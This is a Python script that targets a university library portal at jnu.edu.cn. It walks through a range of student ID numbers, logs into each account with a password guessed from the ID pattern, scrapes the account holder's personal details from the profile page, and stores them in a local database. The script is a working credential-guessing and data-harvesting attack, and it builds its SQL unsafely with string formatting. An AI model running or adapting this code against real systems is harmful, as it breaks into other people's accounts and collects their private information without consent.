#!/usr/bin/python3
# -*- coding: utf-8 -*-

import re
import requests
import psycopg2
from bs4 import BeautifulSoup, element

import socket
_dnscache = {("libsouthic.jnu.edu.cn", 80, 0, 1): [(10, 1, 6, '', ('2001:da8:2002::224', 80, 0, 0)), (2, 1, 6, '', ('202.116.0.224', 80))]}
def _setDNSCache():
    def _getaddrinfo(*args, **kwargs):
        global _dnscache
        if args in _dnscache:
            return _dnscache[args]
        else:
            _dnscache[args] = socket._getaddrinfo(*args, **kwargs)
            return _dnscache[args]
    if not hasattr(socket, "_getaddrinfo"):
        socket._getaddrinfo = socket.getaddrinfo
        socket.getaddrinfo = _getaddrinfo


host = "http://libsouthic.jnu.edu.cn"

def login(session, userid, password):
    session.headers["Referer"] = host + "/login"
    data = {
        "t:formdata": "YO0mInLsxupSFzTGH68d4QXjK7k=:H4sIAAAAAAAAAJWQPUoEQRCFywFlYWURwcBc014DN9HERRCEQYTBWHp6yrGlp7vtqnHWxMhLmHgCMdITbGDmHTyAiYGRgfODsLAimBUfj3of7+EdFqsBLMcu13anJAw6owAjF3IhvVTnKFh6JA7XI6FcQKNTkUpCMU5rKBUfaDTZRoJc+s2Taf9t7eUrgoUY+spZDs4cyQIZVuMLeSWHRtp8mHDQNt+deIalrvEXg/F/DY6DU0iUlGmhibSz08ds++zz/jUCmPhqBQZdg5dElQsZXcINAEPvB8xHmsTMOtS85tpt70835QrvLFom0crwvNpd8rH+/HS7H0EUQ08ZXacP27pmODRY1KAZrkXNUL2u/HRr5vwGvfD11LwBAAA=",
        "t:submit": '["submit_0","submit_0"]',
        "userid": userid,
        "password": password,
        "submit_0": "%e7%99%bb%e5%bd%95"
    }
    session.post(host+"/login.userlogin", data=data)

def infopage(session):
    session.headers["Referer"] = host + "/user"
    session.cookies["navopen"] = "myinfo"
    rqst = session.get(host+"/user/myinfo")
    return rqst.content

infoitem = re.compile(r"^(.*?): (.*?)$")
def parse(page):
    bs = BeautifulSoup(page, "lxml")
    lst = bs.find(class_="unstyled span12")
    info = []
    for li in lst.children:
        if type(li) == element.Tag:
            items = infoitem.match(li.get_text())
            info.append(items.group(2))
    return (info[0], info[1], info[4], info[5])

def main():
    _setDNSCache()
    conn = psycopg2.connect(database="university", user="", password="", host="127.0.0.1", port="5432")
    cur = conn.cursor()
    sql = """INSERT INTO stunum VALUES('%s','%s','%s','%s');"""
    se = requests.Session()
    try:
        cur.execute("SELECT max(id) FROM stunum;")
        find_max = cur.fetchone()
        nowmax = 0 if (not find_max[0]) else int(find_max[0][-4:])
        for lt in range(nowmax+1, 9999):
            uid = "201405%04d" % lt
            pw = "05%04d" % lt
            try:
                login(se, uid, pw)
                page = infopage(se)
                tple = parse(page)
                print(uid + " is found")
            except AttributeError:
                tple = (uid, "", "", "")
                print(uid + " not found")
            finally:
                cur.execute(sql % tple)
                conn.commit()
    except KeyboardInterrupt as ki:
        print(repr(ki))
    except Exception as e:
        print(e)
    finally:
        conn.close()

if __name__ == "__main__":
    main()
